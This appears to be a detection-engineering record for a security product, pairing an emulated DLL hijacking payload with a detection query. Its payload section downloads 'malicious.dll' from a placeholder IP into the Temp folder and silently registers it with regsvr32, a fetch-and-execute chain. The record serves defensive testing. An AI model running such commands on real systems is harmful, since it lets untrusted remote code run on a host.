identity.name: DLL Hijacking via Uncommon Vendor Signed DLL in Microsoft Process
identity.summary: An attacker uses a rare, uncommonly signed DLL to hijack a Microsoft process, bypassing security controls. Cortex detects this by monitoring process creation and file access patterns.
identity.description: An attacker uses a rare, uncommonly signed DLL to hijack a Microsoft process, bypassing security controls. Cortex detects this by monitoring process creation and file access patterns.

payload.code:
cd C:\Windows\Temp
wget http://192.0.2.10/malicious.dll -OutFile hijack.dll
stub hijack.dll
regsvr32 /s hijack.dll

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Vendor Signed DLL Loaded into Microsoft Process
biocs.description: Detection of a DLL signed by an uncommon vendor loaded into a Microsoft process such as regsvr32.exe
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'C:\\Windows\\System32\\regsvr32.exe'
| filter action_file_path contains 'hijack.dll'
| filter action_file_path contains 'Temp'
| filter causality_actor_process_image_name = 'C:\\Windows\\System32\\regsvr32.exe'
